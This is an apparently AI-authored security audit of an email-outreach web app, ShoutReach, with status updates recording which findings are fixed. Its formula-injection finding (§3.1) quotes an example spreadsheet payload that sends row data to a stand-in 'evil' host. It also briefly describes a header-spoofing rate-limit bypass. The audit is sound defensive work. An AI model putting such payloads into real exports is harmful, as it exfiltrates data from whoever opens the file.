# Fable Audit — ShoutReach

> **Status (2026-08-05):** 7 of 13 findings resolved in the scraper rework
> (through `13b032c`). Resolved items are marked inline below with what closed
> them and how it was verified. The rest stay open and are listed in
> [§6 Prioritised punch list](#6-prioritized-punch-list).
>
> Regression tests for every resolved item live in `tests/test_security.py`
> and `tests/test_migrations.py`, so a change that reintroduces one fails the
> suite rather than waiting for the next audit.

---


**Auditor:** Claude (Fable 5), acting as senior staff engineer
**Date:** 2026-07-01
**Repo:** sheham14/outreach-scripts @ master (299439d)
**Scope:** Full repo re-audit — verifies the fixes claimed in [Opus Fixes.md](Opus%20Fixes.md) against the *current* code, then reports findings that are new or still open.
**Companion:** [Fable Study Guide.md](Fable%20Study%20Guide.md) — the concept-by-concept explainer.

---

## TL;DR

The security-hardening pass documented in [Opus Fixes.md](Opus%20Fixes.md) **genuinely landed** — I verified each claimed fix against the code, not the changelog. CSRF, XSS escaping, secret masking, admin gating, the login rate limiter, cookie hardening, PBKDF2-600k, the A/B `import random` fix, and the reply-detection rewrite are all present and correct. The app is meaningfully safer than the version the Opus audit graded.

This pass surfaces **three findings the previous audit missed**, one of which is a reproducible crash:

1. 🔴 **A fresh install crashes on the first contact import** — a schema-migration ordering bug drops the `mx_valid` column on a brand-new database. *Reproduced and confirmed.* Self-heals only after a process restart.
2. 🟠 **Mail-server TLS certificates are not verified** — `smtplib`/`imaplib` default to no verification, so SMTP/IMAP credentials are exposed to a man-in-the-middle. *Confirmed on Python 3.13.*
3. 🟠 **One-click unsubscribe is broken** — the app advertises RFC 8058 one-click unsubscribe but the route only accepts GET, so Gmail/Yahoo's POST gets a 405.

Plus several medium/low items (export formula injection, an uncapped JSON import path, an X-Forwarded-For rate-limit bypass) and the still-open architectural items the previous pass deliberately deferred.

**Good news on the committed-data worry:** I checked git history — `outreach.db`, the scraped CSVs, and the cookie files were **never committed**. They exist only in your local working tree. The exposure is far smaller than the Opus audit feared. Details in §4.

**Overall:** the headline web-security holes are closed. What remains is one embarrassing first-run bug (fix before anyone clones this), a couple of transport/compliance gaps, and the known architectural ceiling that's fine until you have real customers.

---

## Severity legend

- 🔴 **Critical** — breaks on a fresh install, or a data-loss/exploit path; fix before the next person touches it.
- 🟠 **High** — real security or correctness risk; fix soon.
- 🟡 **Medium** — design/robustness issue; fix before scaling or onboarding users.
- 🔵 **Low** — polish, consistency, future-proofing.

---

## 1. Verification of the previous fixes

I confirmed the following against the current code. **These are done — you can say so confidently in an interview.**

| Opus finding | Claimed | Verified in current code |
|---|---|---|
| 1.1 AI keys leaked via `/api/settings` | ✅ | Confirmed. `_is_secret_key()` denylist + heuristic at [app.py:397](app.py#L397); endpoint is `@admin_required`. |
| 1.2 DB viewer leaks keys | ✅ | Confirmed. All `/api/db/*` are `@admin_required`; `_VIEWER_TABLES` ([app.py:1187](app.py#L1187)) **excludes `smtp_accounts` and `users`**; settings rows masked. |
| 1.3 No CSRF | ✅ | Confirmed. `_check_csrf` `before_request` hook ([app.py:202](app.py#L202)); login uses hidden token + same-origin check; JS auto-attaches `X-CSRF-Token`. |
| 1.4 Privilege escalation | ✅ | Confirmed. `@admin_required` on every mutating route (campaigns, contacts, steps, enrollments, accounts, settings, scraper, AI, DB viewer). |
| 1.5 First-run admin race | ✅ | Confirmed. Setup-token flow at [app.py:86](app.py#L86); token printed to logs, required on the first-run form. |
| 1.6 XSS via `esc()` | ✅ (mostly) | Confirmed. `esc()` now escapes `'` and `` ` ``; `escj()` exists and **is used at the two top-risk sites** ([campaigns.js:80](static/js/campaigns.js#L80), [settings.js:142](static/js/settings.js#L142)). See §3.9 for the remaining nuance. |
| 1.8 Login brute-force | ✅ | Confirmed. Per-IP throttle, 10 / 15 min ([app.py:127](app.py#L127)). But see 🟡 3.4 (X-Forwarded-For bypass). |
| 1.9 Cookie hardening | ✅ | Confirmed. `Secure`/`HttpOnly`/`SameSite=Lax`/14-day lifetime/16MB cap ([app.py:64](app.py#L64)). |
| 1.10 Security headers | ✅ | Confirmed. `after_request` sets X-Frame-Options, nosniff, Referrer-Policy, Permissions-Policy, HSTS ([app.py:218](app.py#L218)). |
| 1.11 Password change w/o current | ✅ | Confirmed. Self-service change verifies `current_password` ([app.py:589](app.py#L589)). |
| 1.12 PBKDF2 iterations | ✅ | Confirmed. 600k + legacy-hash transparent rehash on login ([db.py:916](db.py#L916), [db.py:1006](db.py#L1006)). |
| 1.13 CSV import unbounded | ✅ (partial) | Confirmed for **multipart** uploads (8MB/50k-row caps). **The JSON path is still uncapped** — see 🟡 3.5. |
| 2.1 A/B broken (`random`) | ✅ | Confirmed. `import random` present at [db.py:10](db.py#L10). |
| 2.2 Run Now blocks HTTP thread | ✅ | Confirmed. `request_run_now()` sets an Event; route returns instantly ([scheduler.py:35](scheduler.py#L35), [app.py:1315](app.py#L1315)). |
| 2.3 Scheduler in before_request | ✅ | Confirmed. Started once at module load under a lock ([app.py:75](app.py#L75), [scheduler.py:247](scheduler.py#L247)). |
| 2.5 `known_msg_ids` unbounded | ✅ | Confirmed. Bounded to 30 days, backed by index ([sender.py:356](sender.py#L356)). |
| 2.10 Unsubscribe propagation | ✅ | Confirmed. Flips all non-terminal enrollments ([db.py:440](db.py#L440)). |
| 2.11 Message-ID collisions | ✅ | Confirmed. `secrets.token_urlsafe(16)` ([sender.py:111](sender.py#L111)). |
| 4.5 Missing indexes | ✅ | Confirmed. Six hot-path indexes created ([db.py:200](db.py#L200)). |
| 4.2 Scheduler lifecycle | ✅ | Confirmed. `stop()` joins with timeout; event-driven loop, no busy-wait. |
| Reply-detection rewrite | ✅ | Confirmed. msg_id→(campaign,contact) map is the source of truth ([sender.py:357](sender.py#L357)); `mark_enrollment_replied` returns rowcount to de-dupe logs. |

Nice work — this is a real, verifiable hardening pass, not a paper one.

---

## 2. New findings (not in the Opus audit)

### ✅ RESOLVED — 🔴 2.1 A fresh database crashes on the first contact import (`mx_valid` migration bug)

> **Fixed in `13b032c`, 2026-08-05.** Reproduced first, exactly as described. Fresh
> databases now start with a nullable `email`, so the rebuild block only fires on
> genuinely legacy schemas, and that rebuild carries `mx_valid` forward. The bare
> `except: pass` in the column loop now logs. Verified by `tests/test_migrations.py`,
> which covers fresh / legacy / rerun and asserts no column or row is lost.


**This is the most important finding in this document.** I reproduced it.

In [db.py:init_db](db.py#L30) the migrations run in this order:
1. `CREATE TABLE contacts (... email TEXT NOT NULL ...)` — fresh DBs start with a **NOT NULL** email.
2. An `ALTER TABLE` loop adds columns, including `mx_valid` ([db.py:156](db.py#L156)).
3. A rebuild block ([db.py:166-192](db.py#L166-L192)) that fires **whenever `email` is NOT NULL** — i.e. on *every* fresh database — recreates the table as `contacts_new` to make `email` nullable. **`contacts_new` omits the `mx_valid` column, and the `INSERT … SELECT` doesn't carry it.** So immediately after a fresh `init_db()`, the `contacts` table has **no `mx_valid` column.**

Because `init_db()` runs only once at process start ([app.py:58](app.py#L58)), the running process now has a `contacts` table missing `mx_valid`. Any contact import or scrape hits `upsert_contacts`, which inserts `mx_valid` → crash.

**Reproduction (confirmed):**
```
$ DB_PATH=fresh.db python -c "import db; db.init_db(); db.upsert_contacts([{'email':'x@gmail.com','mx_valid':1}])"
sqlite3.OperationalError: table contacts has no column named mx_valid
```
Columns after one `init_db()` on a fresh DB: `email` is nullable (good) but `mx_valid` is **gone**.

**Why the live DB looks fine:** on the *next* process start, `init_db()` runs again; this time `email` is already nullable so the rebuild is skipped, and the `ALTER` loop re-adds `mx_valid`. So the bug **self-heals after one restart** — which is why your production DB has the column and you never noticed. But a reviewer who clones the repo, runs it, and imports a CSV hits a 500 on their first real action.

**Impact:** first-run breakage on the single most common first task. For a portfolio project, that's a bad first impression. Also: the rebuild silently *drops any existing `mx_valid` data* on the one migration where it fires (historical, low ongoing risk).

**Fix (either works):**
- Add `mx_valid INTEGER DEFAULT NULL` to the `contacts_new` definition and to the `INSERT … SELECT` (carry it forward), **or**
- Simplest and most robust: move the `ALTER TABLE` column-adds and index creation to run *after* the nullable-email rebuild, and include `mx_valid` in the rebuilt table. Then re-add columns idempotently.
- Bonus: the migration loop swallows every exception with a bare `except: pass` ([db.py:162](db.py#L162)) — a genuine migration failure would be invisible. Log it at least at debug level (the index loop already does this; the column loop should too).

---

### ✅ RESOLVED — 🟠 2.2 SMTP/IMAP connections do not verify TLS certificates (credential MITM)

> **Fixed in `13b032c`, 2026-08-05.** One shared `ssl.create_default_context()` is now
> passed to `SMTP_SSL`, `starttls()` and all three `IMAP4_SSL` call sites. Verified
> by `tests/test_security.py`, which asserts `CERT_REQUIRED`, `check_hostname`, and
> that no call site was missed.


Confirmed on Python 3.13.7. `sender.py` opens mail connections with no SSL context:
- `smtplib.SMTP_SSL(host, port)` — [sender.py:178](sender.py#L178)
- `server.starttls()` with no context — [sender.py:182](sender.py#L182)
- `imaplib.IMAP4_SSL(host)` — [sender.py:205](sender.py#L205), [sender.py:343](sender.py#L343), [sender.py:517](sender.py#L517)

Python's `smtplib` and `imaplib`, when given no context, use `ssl._create_stdlib_context()`, which sets `verify_mode = CERT_NONE` and `check_hostname = False` — i.e. **it does not validate the server's certificate at all.** (I verified this directly: both `SMTP_SSL`/`starttls` and `IMAP4_SSL` resolve to `_create_stdlib_context`, not `create_default_context`.)

**Impact:** an attacker positioned on the network path between the app and the mail provider can present *any* certificate, and the app will hand over the SMTP/IMAP **username and password** in the TLS session. On a trusted GCP network to Gmail the practical risk is low, but this is a textbook gap and trivially fixed.

**Fix:** create one verifying context and pass it everywhere:
```python
import ssl
_TLS = ssl.create_default_context()          # verifies cert + hostname
smtplib.SMTP_SSL(host, port, context=_TLS, timeout=15)
server.starttls(context=_TLS)
imaplib.IMAP4_SSL(host, ssl_context=_TLS, timeout=15)
```

---

### ✅ RESOLVED — 🟠 2.3 One-click unsubscribe is advertised but broken (RFC 8058)

> **Fixed in `13b032c`, 2026-08-05.** The route accepts `GET` and `POST`. Verified by
> `tests/test_security.py`: a POST is routed rather than 405, and an invalid token
> is still rejected with 400.


[sender.py:277-278](sender.py#L277-L278) sets both headers that ask Gmail/Yahoo to POST an unsubscribe:
```python
msg["List-Unsubscribe"] = f"<{unsub_url}>, <mailto:...>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"
```
RFC 8058 requires the provider to send an **HTTP POST** to `unsub_url`. But the route [app.py:369](app.py#L369) `@app.route("/unsubscribe/<token>")` defaults to **GET only** — a POST returns **405 Method Not Allowed**. So the native "Unsubscribe" button in Gmail fails, while the app is telling Gmail it supports it.

**Impact:** deliverability and compliance. Broken one-click unsubscribe is exactly what the 2024 Gmail/Yahoo bulk-sender rules penalize; a user who can't unsubscribe may hit "spam" instead.

**Fix:** accept POST on the route: `@app.route("/unsubscribe/<token>", methods=["GET", "POST"])`. It's already exempt from login and CSRF, so it just works. (Optional nicety: on POST, return `200` with an empty body — the provider doesn't render it.)

---

## 3. Other findings

### ✅ RESOLVED — 🟡 3.1 Excel/CSV export formula injection

> **Fixed in `13b032c`, 2026-08-05.** A `_no_formula()` helper prefixes any cell
> starting with `= + - @` or a leading tab/CR, applied to every free-text cell in
> both the xlsx and CSV export paths.

The campaign Excel export ([app.py:900](app.py#L900)) and the DB-viewer CSV export ([app.py:1290](app.py#L1290)) write contact-controlled strings (company names, addresses — many scraped from arbitrary websites) directly into cells. If a value starts with `=`, `+`, `-`, or `@`, Excel/Sheets may execute it as a **formula** on open (CSV/formula injection, aka "CSV injection"). A malicious website name like `=HYPERLINK("http://evil/?"&A1)` could exfiltrate row data when the operator opens the export.
**Fix:** prefix any cell value beginning with `= + - @` (or a tab/CR) with a single quote, or coerce to text. One small helper applied in both export paths.

### ✅ RESOLVED — 🟡 3.2 The JSON contact-import path has no row cap

> **Fixed in `13b032c`, 2026-08-05.** This became load-bearing: the new local scrape
> worker pushes its leads through exactly this path. The JSON body now honours the
> same 50k row cap as the multipart path, and inline MX validation is skipped above
> 500 rows -- the worker pre-validates and sends `mx_valid` per row, keeping the
> blocking DNS lookups off the single request thread entirely.

[app.py:1050](app.py#L1050): the multipart CSV path enforces 8MB/50k rows, but the JSON path (`rows = data.get("rows", [])`) only has the global 16MB body limit. A 16MB JSON array is easily 100k+ rows, and each row with an email triggers a **synchronous DNS MX lookup** on the request thread ([app.py:1076](app.py#L1076)). That can tie up the single worker for a long time.
**Fix:** apply the same `_CSV_MAX_ROWS` cap to the JSON path, and/or move MX validation to the scheduler/background instead of doing it inline during import.

### 🟡 3.3 Failed (non-bounce) sends retry forever with no backoff
In [scheduler.py:150-176](scheduler.py#L150-L176), a send that fails for a transient reason (`SMTPServerDisconnected`, a `421` throttle, a network blip) is neither advanced nor marked — the enrollment stays `queued` and due, so it's retried **every cycle, indefinitely**, with no backoff and no attempt cap. A persistently failing address (or a wrong SMTP password) produces a hot retry loop and log spam.
**Fix:** track an attempt count / next-retry timestamp on the enrollment; apply exponential backoff; give up (mark `error`) after N attempts. This pairs with the audit's open "no send idempotency" item.

### ✅ RESOLVED — 🟡 3.4 Login rate limiter is bypassable via `X-Forwarded-For`

> **Fixed in `13b032c`, 2026-08-05.** `_client_ip()` now counts back from the
> rightmost XFF entry using `TRUSTED_PROXY_COUNT` (default 1, matching the single
> Nginx in front of the GCP deploy) instead of trusting the client-supplied
> leftmost value. Verified by `tests/test_security.py` with spoofed hops prepended.

[app.py:120](app.py#L120) `_client_ip()` trusts the **first** value of the client-supplied `X-Forwarded-For` header. An attacker can rotate that header on every request to get a fresh per-IP bucket and defeat the 10-per-15-min throttle. Whether this is exploitable depends on the Nginx config: if Nginx doesn't overwrite XFF with the real peer IP, the client controls it entirely.
**Fix:** use Werkzeug's `ProxyFix` with a known trusted-proxy count, or read the *rightmost* XFF entry appended by *your* proxy, not the leftmost client-supplied one. Confirm the Nginx `proxy_set_header X-Forwarded-For` line while you're there.

### ✅ RESOLVED — 🟡 3.5 Bounce scan marks *every* unseen inbox message as read

> **Fixed in `13b032c`, 2026-08-05.** The bounce scan fetches `BODY.PEEK[]`, which
> does not set `\Seen`. The reply scanner is deliberately unchanged: it opens the
> mailbox `readonly=True`, so the server never sets flags there regardless.

[sender.py:519](sender.py#L519) selects the inbox **not** read-only, then [sender.py:526](sender.py#L526) does `M.fetch(num, "(RFC822)")` on each **UNSEEN** message from the last 7 days. Fetching `RFC822` (rather than `BODY.PEEK[]`) implicitly sets the `\Seen` flag as a side effect — so *all* recent unread mail gets marked read, not just the bounces the code decides to process. Harmless on a dedicated sending mailbox; disruptive if that inbox is shared with a human. (The reply scanner does this correctly — it selects `readonly=True` and fetches `RFC822.HEADER`.)
**Fix:** either open the inbox `readonly=True`, or fetch with `BODY.PEEK[]` so reading doesn't set `\Seen`, and only set `\Seen` explicitly on confirmed bounces (as the code already intends to at [sender.py:557](sender.py#L557)).

### 🔵 3.6 Password-length policy is inconsistent
First-run (12), self-service change (12), but admin "Add User" requires only **8** ([app.py:552](app.py#L552)) and the modal placeholder says "Min 8 characters" ([index.html:49](templates/index.html#L49)). Pick one minimum (12) and apply it everywhere.

### 🔵 3.7 `/logout` is GET and CSRF-exempt
[app.py:334](app.py#L334) allows GET and is in `_CSRF_EXEMPT_PATHS`, so a hostile page can force a logout via `<img src=".../logout">`. Low impact (annoyance, not compromise), but making logout POST-only with the CSRF token closes it.

### 🔵 3.8 Bulk delete hard-deletes; single delete soft-deletes
`delete_contact` sets `status='deleted'` (soft) but `delete_contacts` (bulk) runs a real `DELETE` (hard) — [db.py:435](db.py#L435) vs [db.py:391](db.py#L391). Inconsistent semantics; a user expecting the "show deleted" toggle to recover a bulk delete will be surprised. Decide on one behavior.

### 🔵 3.9 XSS escaping: right primitives, incomplete adoption
`escj()` is correctly used at the two highest-risk interpolation sites, and `esc()` now covers `'`. But most other `onclick="...(${id})"` handlers pass **numeric IDs**, which are safe, so the remaining risk is small. The residual concern is future edits: the pattern of building inline handlers by string concatenation invites the next XSS. The durable fix is delegated event listeners (`data-` attributes + `addEventListener`), which also unlocks a strict **Content-Security-Policy** (still absent — the app sets no CSP because inline handlers would break under one).

### 🔵 3.10 Successful logins count against the rate-limit budget
[app.py:135](app.py#L135) appends to the attempt deque before the credentials are checked, so legitimate logins consume the same 10-per-15-min budget as failures. A user who logs in and out a few times could lock themselves out. Minor; only count *failed* attempts.

---

## 4. The committed-data question — resolved, and smaller than feared

The Opus audit (§1.17) worried that `outreach.db` and the scraped CSVs might be in git history. **I checked. They are not.**

```
$ git log --all --oneline -- outreach.db outreach.db-wal "*.csv" "cookies_*.json"
(no output — never committed)
$ git ls-files | grep -iE '\.(db|csv)$|cookies'
(no output — nothing sensitive is tracked)
```

`.gitignore` correctly excludes them, and they were ignored from the start, so they live **only in your local working tree** — not in the repo, not on GitHub. The real-business-email privacy exposure is therefore local-disk-only.

**Still worth doing (🔵 low):**
- These files are dead weight in your working directory. If you ever `git add -A` without checking, the `.db-wal` (currently 2MB+) and CSVs are ignored — good — but the habit is worth confirming. No history scrub is needed because there's nothing to scrub.
- **One thing that *is* tracked and worth a thought:** `shoutreach-internal.html` and `ssh-linux-reference.html` are committed and contain your real server Linux username (`sheham_shahid`), full server paths, the systemd/Nginx layout, and the deploy mechanism. None of that is a *secret* (no keys/passwords), but if this repo is ever made public it's free reconnaissance for an attacker. If the repo stays private, it's fine. If you plan to open-source or show the repo, move those two internal docs out, or redact the username/paths.

---

## 5. Still-open items the previous pass deliberately deferred

These remain true and are correctly scoped as "v2." Listed so you can speak to them, not because they're urgent for a personal tool.

| Item | Why it's still open | When it matters |
|---|---|---|
| Secrets stored plaintext in SQLite | Needs an encryption key source (env/KMS) | Before the DB file is ever shared or backed up off-box |
| No automated tests | Not a "fix," it's new work | Now, honestly — it's the single highest-leverage improvement |
| SQLite + single worker + in-process scheduler | Deliberate architecture | Only when going multi-server / multi-customer |
| No send idempotency (transactional outbox) | Needs a deterministic send key + `ON CONFLICT` | Under crashes/retries at higher volume |
| Serial campaign processing | Same thread, sequential sleeps | When you run several active campaigns at once |
| Deploy pipeline: no test gate, unpinned deps | CI work (`pip-compile` + `--require-hashes`) | Before a team relies on the pipeline |
| Dockerfile installs only flask/gunicorn; `fly.toml` placeholder | Unused (systemd on GCP is the real deploy) | Ship them correctly or delete them to avoid confusion |
| AI prompt has no injection defenses | Cosmetic for a copy-review tool | If AI output ever drives an action, not just display |
| No CSP / inline event handlers | Requires delegated listeners app-wide | When you want defense-in-depth against XSS |

---

## 6. Prioritized punch list

In order of effort-to-impact:

**Done (2026-08-05, scraper rework):**

1. ~~Fix the `mx_valid` migration bug (🔴 2.1).~~ ✅
2. ~~Accept POST on `/unsubscribe` (🟠 2.3).~~ ✅
3. ~~Verify mail-server TLS certs (🟠 2.2).~~ ✅
4. ~~Sanitize export cells against formula injection (🟡 3.1).~~ ✅
5. ~~Cap the JSON import path + move MX checks off the request thread (🟡 3.2).~~ ✅
7. ~~Harden `_client_ip()` (🟡 3.4).~~ ✅
8. ~~`BODY.PEEK[]` in the bounce scan (🟡 3.5).~~ ✅
10. ~~Write the first tests.~~ ✅ Partly — five suites now exist covering
    migrations, extraction, duplicate handling, the worker protocol and these
    security fixes. `_verify_password`, `_render` and the unsubscribe token
    helpers are still untested.

**Still open:**

6. **Add retry/backoff + attempt cap for failed sends (🟡 3.3).** ~1 hr. Also closes the forever-retry loop.
   *Deliberately out of scope for the scraper work — it is a sending-path
   concern and bundling it would have made that change open-ended.*
9. **The low items (3.6–3.10):** ~1 hr total, batch them.
11. **Finish the test coverage from item 10** — `_verify_password`, `_render`,
    and `_make_unsub_token`/`_verify_unsub_token`.

Items 1–3 are under 30 minutes combined and remove the two things a reviewer would actually trip over.

---

## 7. One-line verdict

> **Update, 2026-08-05:** the seven findings above are closed and regression-tested.
> What remains is the send retry/backoff item, the five low-severity items, and the
> architectural ceiling in §5 — none of which block anything today.

**The hardening pass was real — the web-security fundamentals are genuinely fixed and verified. What's left is one fresh-install crash to fix before anyone clones this, two quick transport/compliance gaps, and the well-understood architectural ceiling that's exactly right for a solo tool and exactly what you'd rebuild first for real customers.**
